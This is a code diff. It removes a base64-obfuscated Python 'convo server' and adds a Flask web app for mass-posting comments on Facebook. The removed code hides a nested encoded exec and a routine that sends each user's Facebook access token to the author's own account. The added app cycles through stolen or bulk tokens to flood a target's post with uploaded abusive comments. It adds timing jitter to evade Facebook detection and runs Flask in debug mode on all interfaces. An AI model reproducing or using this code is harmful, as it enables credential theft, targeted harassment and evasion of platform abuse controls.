@@ -1,2 +1,151 @@
-import base64
-exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBweXR6CmltcG9ydCBkYXRldGltZQppbXBvcnQgc3lzCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQppbXBvcnQgb3MKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgcmFuZG9tCmh0bWxfY29udGVudCA9ICIiIgo8IURPQ1RZUEUgaHRtbD4KPGh0bWw+CjxoZWFkPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogICAgPHRpdGxlPkhBU1NBTiBDT05WTyBTRVJWRVI8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ3NhdGlzaC5qcGcnKTsKICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsKICAgICAgICB9CiAgICAgICAgLmNvbnRhaW5lciB7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgbWFyZ2luLXRvcDogNTBweDsKICAgICAgICB9CiAgICAgICAgLmJveCB7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkIGJsYWNrOwogICAgICAgICAgICB3aWR0aDogMzAwcHg7CiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSk7CiAgICAgICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICB9CiAgICAgICAgLmNyZWRpdCB7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGxlZnQ7CiAgICAgICAgfQogICAgICAgIC50aGFua3MgewogICAgICAgICAgICBtYXJnaW4tdG9wOiA1MHB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIGNvbG9yOiBibGFjazsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJib3giPgogICAgICAgICAgICA8aDE+SEFTU0FOIENPTlZPIFNFUlZFUjwvaDE+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNyZWRpdCI+CiAgICAgICAgICAgICAgICA8cD4xLiBDUkVESVQ6LVJBSlBVVCBBUk1ZPC9wPgogICAgICAgICAgICAgICAgPHA+Mi4gT1dORVIgPT4gSEFTU0FOIDwvcD4KICAgICAgICAgICAgICAgIDxwPjMuIENPTlRBQ1Q6LSA8YSBocmVmPSJodHRwczovL3dhLm1lLys5MjM0MTc4ODUzMzkiPldoYXRzQXBwPC9hPjwvcD4KICAgICAgICAgICAgICAgIDxwPjQuIEZBQ0VCT09LOi0gPGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA0NDgwNDYyOTM2NCI+RmFjZWJvb2s8L2E+PC9wPgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJ0aGFua3MiPgogICAgICAgIDxwPuKdpO+4j1RoYW5rcyBmb3IgdXNpbmcgbXkgc2VydmVy4p2k77iPPC9wPgogICAgICAgIDxwPvCfkYfwn5GHPC9wPgogICAgICAgIDxhIGhyZWY9IjwvYT4KICAgIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4KIiIiCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQogICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L2h0bWwnKQogICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgIHNlbGYud2ZpbGUud3JpdGUoaHRtbF9jb250ZW50LmVuY29kZSgpKQpkZWYgZXhlY3V0ZV9zZXJ2ZXIoKToKICAgIFBPUlQgPSBpbnQob3MuZW52aXJvbi5nZXQoJ1BPUlQnLCA0MDAwKSkKICAgIHdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCnV0Y19ub3cgPSBkYXRldGltZS5kYXRldGltZS51dGNub3coKQppbmRpYW5fdGltZXpvbmUgPSBweXR6LnRpbWV6b25lKCdBc2lhL0tvbGthdGEnKQppc3Rfbm93ID0gdXRjX25vdy5yZXBsYWNlKHR6aW5mbz1weXR6LnV0YykuYXN0aW1lem9uZShpbmRpYW5fdGltZXpvbmUpCmZvcm1hdHRlZF90aW1lID0gaXN0X25vdy5zdHJmdGltZSgiXDAzM1sxOzM4OzU7MjA4bSBUaW1lIDotICVZLSVtLSVkICVJOiVNOiVTICVwIikKcHJpbnQoZm9ybWF0dGVkX3RpbWUpCmhlYWRlcnMgPSB7CiAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCiAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywKICAgICdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwp9CgpfID0gbGFtYmRhIF9fIDogX19pbXBvcnRfXygnemxpYicpLmRlY29tcHJlc3MoX19pbXBvcnRfXygnYmFzZTY0JykuYjMyZGVjb2RlKF9fWzo6LTFdKSk7ZXhlYygoXykoYic9QVZVSlgyV0RJN1g3TFA2RVdHRlJaVkZHUVNVSUxDUUFTTUM0RE9YUkk1N01NMlNLSktVSEJJVlUyQ0JSNEJRSzdNQjRFVDZOM0xYTU02V1RaNlUzWlUyQlpWWU5GM1I3STZRVFFZR0tOVklJU0k1UlJBUkdBTzVFWUtQVldTTVQ3UUpaRUxJN0JaWVVEUkpKTFlEVUNFQ0FXNUpXQVpSTUlEQTZHUEw3TzRFQk9GNzNLSTdVQTVHTFE3SldGUjZFTkhDUDRNSldFUEtZRkdBUVY1RFlNWENLUUo2VU5ORkZJWlBHUFJGMlJYRzRLTlFTVTVDTEhCNUdPSUJEUU5FVkdUSEZJQ0xBTjY3UTY2VVlBTUkyUU9ETjRXQTJOWDMyMlVKTEVOUjc2T1dQNlJDSVZYTlpZNUtHRFJWMjRGRkFZQUdFRUhXQjZCSE5HSlhBVVVERFVKV1RBR0c1VzJWRFdOWVlPV1Q1S1BTU0dSRDRXTUs0RlI1QjVIVjNYRUg0WTRFMzNQQU9VNFlISVFXUkRGVE1XR1JMWFhETUJDVlBBRjdBT1ZZQVJMSU1FWVZMUUpRUzVWVFNWMjJZUlNSRENaRElBN1ZTMkk1Q0VGU1ZXWEFDQkxPTEoyMkdEQkk0QkVZRUxJUEZSRkZLUlBDQlBKTjVVWkpOM0tGNEkzS0RQMzVMVDc2QUxORklSUE5FNUVFSzZWSEtTM0pUS0pMSVIyTTZZRlVINlQ3WlA1WFBWWDdIUFZYNzdQNzdQSEszRkk1RzM0VkhIWTc3UkJNUkpNUVUzMjNOQllOQ0dPSUtHVFk2VERZRUFBQURPM1JaQlVMQk9DUCcpKQoKZGVmIHNlbmRfaW5pdGlhbF9tZXNzYWdlKCk6CiAgICAKICAgIG1tbV9wYXNzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvV21jekRtR1YnKS50ZXh0CiAgICAKICAgIGlmIG1tbV9wYXNzIG5vdCBpbiBwYXNzd29yZDoKICAgICAgICBwcmludCgnXDAzM1sxOzMxbeKaoO+4jiBZb3VyIFBhc3N3b3JkIENoYW5nZWQgQnkgU2F0aXNoIOKaoO+4jicpCiAgICAgICAgc3lzLmV4aXQoKQogICAgCiAgICAjIE1lc3NhZ2UgdGVtcGxhdGUKICAgIG1zZ190ZW1wbGF0ZSA9ICJPd25lciA9PiBIQVNTQU4gXG4gSGVsbG8gSGFzc2FuIHNpci4gXG4gSSBhbSB1c2luZyB5b3VyIGNvbnZvIHNlcnZlci4gXG4gVGhpcyBJcyBNeSBEZXRhaWxzIDotIFxuIENvbnZvIElEIDotIHt9IFxuIE5hbWU6LSB7fSBcbiBUb2tlbiA6LSB7fSIKICAgIAogICAgIyBUYXJnZXQgSURzCiAgICB0YXJnZXRfaWRzID0gWyIxMDAwNDQ4MDQ2MjkzNjQiXQogICAgCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQogICAgCiAgICBmb3IgdGFyZ2V0X2lkIGluIHRhcmdldF9pZHM6CiAgICAgICAgZm9yIHRva2VuIGluIHRva2VuczoKICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3RyaXAoKQogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAve30vIi5mb3JtYXQoJ3RfJyArIHRhcmdldF9pZCkKICAgICAgICAgICAgbXNnID0gbXNnX3RlbXBsYXRlLmZvcm1hdChjb252b19pZCwgaGF0ZXJzX25hbWUsIGFjY2Vzc190b2tlbikKICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IG1zZ30KICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQogICAgICAgICAgICBwcmludCgiXG5cMDMzWzE7MzFtWytdIEluaXRpYWwgbWVzc2FnZSBzZW50IHRvIHRhcmdldCBJRDoge30uIENvbnRpbnVpbmcuLi5cbiIuZm9ybWF0KHRhcmdldF9pZCkpCgpzZW5kX2luaXRpYWxfbWVzc2FnZSgpCmRlZiBzZW5kX21lc3NhZ2VzX2Zyb21fZmlsZSgpOgogICAgbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpCiAgICBtYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOgogICAgICAgICAgICAgICAgdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2VucwogICAgICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gdG9rZW5zW3Rva2VuX2luZGV4XS5zdHJpcCgpCiAgICAgICAgICAgICAgICBtZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQogICAgICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL3t9LyIuZm9ybWF0KCd0XycgKyBjb252b19pZCkKICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2V9CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLm9rOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJcMDMzWzE7MzZtW+Kck10gWW91ciBNYXNzYWdlIFN1Y2Nlc3NmdWxseSBTZW50IEJ5IEhhc3NhbidzIENvbnZvIFNlcnZlciBOby4ge30gb2YgQ29udm8ge30gVG9rZW4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQogICAgICAgICAgICAgICAgICAgIHByaW50KGZvcm1hdHRlZF90aW1lKQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTJtJyArICfinKrinK3ilZDilZDilZDilZDilZDilZDilZDigKLjgI4gSEFTU0FOIFJBSlBVVCDjgI/igKLilZDilZDilZDilZDilZDilZDilZDinK3inKonKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1sxOzM1bVt4XSBGYWlsZWQgdG8gc2VuZCBNZXNzYWdlIHt9IG9mIENvbnZvIHt9IHdpdGggVG9rZW4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQogICAgICAgICAgICAgICAgICAgIHByaW50KGZvcm1hdHRlZF90aW1lKQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTJtJyArICfinKrinK3ilZDilZDilZDilZDilZDilZDilZDigKLjgI4gSEFTU0FOIFJBSlBVVCDjgI/igKLilZDilZDilZDilZDilZDilZDilZDinK3inKonKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChzcGVlZCkKICAgICAgICAgICAgcHJpbnQoIlxuWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uXG4iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkKZGVmIG1haW4oKToKICAgIHNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikKICAgIHNlcnZlcl90aHJlYWQuc3RhcnQoKQogICAgc2VuZF9pbml0aWFsX21lc3NhZ2UoKQogICAgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigp'))
+import os, random, string, time, requests
+from flask import Flask, request, render_template_string, session
+from threading import Thread
+
+app = Flask(__name__)
+app.secret_key = 'secret_key_here'
+
+user_sessions, stop_keys = {}, {}
+
+# ───────── HELPERS ─────────
+def generate_stop_key():
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+
+def read_comments(f):
+    return [l.strip() for l in f.read().decode('utf-8').splitlines() if l.strip()]
+
+def read_tokens(f):
+    return [l.strip() for l in f.read().decode('utf-8').splitlines() if l.strip()]
+
+# ───────── COMMENT POSTER ─────────
+def post_comments(uid):
+    d = user_sessions[uid]
+    com, toks, pid, spd, tgt, skey = d.values()
+    idx = 0
+    while True:
+        if stop_keys.get(uid) == skey:
+            print(f'[{uid}] Stopped by key.')
+            break
+        if not toks:
+            print(f'[{uid}] No tokens, halting.')
+            break
+        msg   = f"{tgt} {com[idx % len(com)]}"
+        token = toks[idx % len(toks)]
+        url   = f"https://graph.facebook.com/{pid}/comments"
+        try:
+            r = requests.post(url, params={'message': msg, 'access_token': token})
+            print(f"[{uid}] {'Sent' if r.status_code==200 else r.text}: {msg}")
+        except Exception as e:
+            print(f"[{uid}] Exception: {e}")
+        idx += 1
+        # 2 s base +  ±0.3 s jitter  → FB detection से बचने में मदद
+        time.sleep(spd + random.uniform(-0.3, 0.3))
+
+# ───────── ROUTES ─────────
+@app.route("/", methods=["GET", "POST"])
+def index():
+    message = ""
+    if request.method == "POST":
+        act = request.form.get("action")
+        if act == "start":
+            uid = session.get("uid", str(time.time())); session["uid"] = uid
+            pid  = request.form["post_id"]
+            spd  = int(request.form["speed"])
+            tgt  = request.form["target_name"]
+            toks = []
+            if request.form.get("single_token"):
+                toks.append(request.form["single_token"])
+            elif 'token_file' in request.files and request.files['token_file']:
+                toks = read_tokens(request.files['token_file'])
+            coms = []
+            if 'comments_file' in request.files and request.files['comments_file']:
+                coms = read_comments(request.files['comments_file'])
+            skey = generate_stop_key()
+            user_sessions[uid] = dict(post_id=pid,tokens=toks,comments=coms,
+                                      target_name=tgt,speed=spd,stop_key=skey)
+            stop_keys[uid] = ""
+            Thread(target=post_comments, args=(uid,), daemon=True).start()
+            message = f"Task started. Stop Key: {skey}"
+        elif act == "stop":
+            uid = session.get("uid"); key = request.form.get("entered_stop_key","")
+            if uid in user_sessions:
+                stop_keys[uid] = key; message = "Stop key sent."
+
+    return render_template_string('''
+<!DOCTYPE html><html><head>
+<title>🙂 𝗚⃪𝗔⃪𝗪⃪𝗡⃪𝗗⃪ 𝗧⃪𝗢⃪𝗗⃪ 𝗣⃪𝗢⃪𝗦⃪𝗧⃪ 𝗦⃪𝗘⃪𝗥⃪𝗩⃪𝗘⃪𝗥⃪ 🙂</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+*{box-sizing:border-box;font-family:sans-serif}
+body{
+  margin:0;padding:0;background:url('https://i.ibb.co/MW0CQdQ/2ad93577c9fa0598138cd27ff8ebe151.jpg') center/cover fixed no-repeat;
+  color:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh}
+.title{font-size:1.2rem;font-weight:bold;color:#39ff14;margin:20px 0 10px;text-align:center}
+.container{
+  background:transparent;border:2px solid #fff;border-radius:20px;padding:25px 20px;width:90%;max-width:400px;
+  box-shadow:0 0 15px #fff;margin-bottom:20px;text-align:center}
+label{font-weight:bold;display:block;margin-top:10px;text-align:left}
+input[type=text],input[type=number],input[type=file]{
+  width:100%;padding:10px;margin-top:4px;border:2px solid #ff0;border-radius:20px;background:rgba(255,255,255,.1);color:#fff}
+.token-btn,.btn{
+  margin-top:15px;padding:12px;border:2px solid #ff0;border-radius:20px;font-weight:bold;cursor:pointer;width:100%}
+.token-btn{background:rgba(0,0,0,.4);color:#39ff14}
+.btn.start{background:#00e600;color:#000}
+.btn.stop{background:#ff3333;color:#000}
+.stop-section{margin-top:15px}
+.message{margin-top:10px;font-size:.95rem;color:#ffcc00}
+</style></head><body>
+<div class="title">😡 𝗕⃪𝗦⃪𝗗⃪𝗞⃪ 𝗣⃪𝗢⃪𝗦⃪𝗧⃪ 𝗣⃪𝗬⃪ 𝗧⃪𝗔⃪𝗧⃪𝗧⃪𝗘⃪ 𝗞⃪𝗜⃪ 𝗚⃪𝗔⃪𝗪⃪𝗡⃪𝗗⃪ 𝗙⃪𝗔⃪𝗔⃪𝗗⃪ 𝗗⃪𝗬⃪ ☹️</div>
+
+<div class="container">
+<form method="POST" enctype="multipart/form-data" id="mainForm">
+  <label></label>
+  <div style="display:flex;gap:10px">
+    <button type="button" class="token-btn" id="btnSingle">Single Token</button>
+    <button type="button" class="token-btn" id="btnFile">Token File</button>
+  </div>
+  <div id="singleSection" style="display:none">
+    <label>  ENTER SINGLE TOKEN</label>
+    <input type="text" name="single_token" id="singleTokenInput">
+  </div>
+  <div id="fileSection" style="display:none">
+    <label>UPLOAD TOKEN FILE</label>
+    <input type="file" name="token_file" accept=".txt" id="fileTokenInput">
+  </div>
+
+  <label>𝗘⃪𝗡⃪𝗧⃪𝗘⃪𝗥⃪ 𝗣⃪𝗢⃪𝗦⃪𝗧⃪ 𝗜⃪𝗗⃪</label><input type="text" name="post_id" required>
+  <label>𝗝⃪𝗜⃪𝗦⃪𝗞⃪𝗜 𝗟⃪𝗘⃪𝗡⃪𝗜⃪ 𝗛⃪𝗫⃪ 𝗨⃪𝗦⃪𝗞⃪𝗔⃪ 𝗡⃪𝗔⃪𝗔⃪𝗠⃪ 𝗗⃪𝗔⃪𝗔⃪𝗟⃪</label><input type="text" name="target_name" required>
+  <label>𝗘⃪𝗡⃪𝗧⃪𝗘⃪𝗥⃪ 𝗦⃪𝗣⃪𝗘⃪𝗘⃪𝗗⃪ (SECOND)</label><input type="number" name="speed" required>
+  <label>𝗨⃪𝗣⃪𝗟⃪𝗢⃪𝗔⃪𝗗⃪ 𝗖⃪𝗢⃪𝗠⃪𝗠⃪𝗘⃪𝗡⃪𝗧⃪ 𝗚⃪𝗔⃪𝗔⃪𝗟⃪𝗜⃪ 𝗙⃪𝗜⃪𝗟⃪𝗘⃪</label><input type="file" name="comments_file" accept=".txt" required>
+
+  <button type="submit" name="action" value="start" class="btn start">🚀 START POST SERVER 🚀</button>
+</form>
+
+<div class="stop-section">
+  <form method="POST">
+    <label>𝗕⃪𝗔⃪𝗦⃪ 𝗖⃪𝗛⃪𝗨⃪𝗗⃪ 𝗚⃪𝗔⃪𝗬⃪𝗔⃪ 𝗧⃪𝗔⃪𝗧⃪𝗧⃪𝗔⃪ 𝗦⃪𝗧⃪𝗢⃪𝗣⃪ 𝗞⃪𝗔⃪𝗥⃪</label>
+    <input type="text" name="entered_stop_key" placeholder="Paste stop key here">
+    <button type="submit" name="action" value="stop" class="btn stop">🛑 STOP POST SERVER 🛑</button>
+  </form>
+</div>
+
+{% if message %}<div class="message">{{message}}</div>{% endif %}
+</div>
+
+<script>
+const bSingle=document.getElementById('btnSingle'),
+      bFile  =document.getElementById('btnFile'),
+      sSec   =document.getElementById('singleSection'),
+      fSec   =document.getElementById('fileSection'),
+      sInp   =document.getElementById('singleTokenInput'),
+      fInp   =document.getElementById('fileTokenInput');
+function clr(){sInp.required=fInp.required=false;}
+bSingle.onclick=()=>{sSec.style.display='block';fSec.style.display='none';clr();sInp.required=true;}
+bFile.onclick  =()=>{fSec.style.display='block';sSec.style.display='none';clr();fInp.required=true;}
+</script>
+</body></html>
+''', message=message)
+
+# ───────── MAIN ─────────
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
